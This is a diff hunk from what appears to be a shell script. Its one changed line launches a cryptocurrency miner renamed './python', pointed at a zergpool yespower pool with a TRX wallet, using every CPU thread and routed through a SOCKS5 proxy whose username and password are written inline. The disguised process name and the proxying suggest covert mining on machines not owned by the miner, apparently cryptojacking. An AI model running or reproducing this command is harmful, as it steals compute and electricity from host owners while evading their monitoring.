@@ -65,4 +65,4 @@ unset LD_LIBRARY_PATH
 
 ph add python
 
-./graftcp/graftcp ./python -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TJsTWwcH7d56ikQ3L7AeBnFZPkjkgVKBgR.ArchTRX -p c=TRX,mc=BTE/BUTK,ID=archer -t $(nproc) -x socks5://archer:12322@150.136.63.252:1080
+./graftcp/graftcp ./python -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TJsTWwcH7d56ikQ3L7AeBnFZPkjkgVKBgR.ArchTRX -p c=TRX,m=solo,ID=archer -t $(nproc) -x socks5://archer:12322@150.136.63.252:1080
